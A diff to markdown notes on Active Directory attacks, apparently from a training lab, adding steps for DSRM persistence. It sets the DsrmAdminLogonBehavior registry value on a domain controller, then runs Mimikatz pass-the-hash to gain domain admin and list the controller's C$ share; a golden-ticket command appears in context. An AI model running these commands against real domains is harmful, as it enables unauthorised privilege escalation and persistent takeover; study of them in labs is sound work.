@@ -447,4 +447,9 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 
 - Since it is the local administrator of the DC, we can pass the hash to authenticate.
 - But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash
-- `Enter-PSSession -ComputerName dcorp-dc New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD`
+- `Enter-PSSession -ComputerName dcorp-dc`
+- `New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD`
+
+- Now we have the hash of the DSRM administrator account and have changed the logon type, we can use below command to get domain admin privilege.
+- `Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:<ntlm-hash-got-from-first-one> /run:powershell.exe"'`
+- `ls \\dcorp-dc\c$`
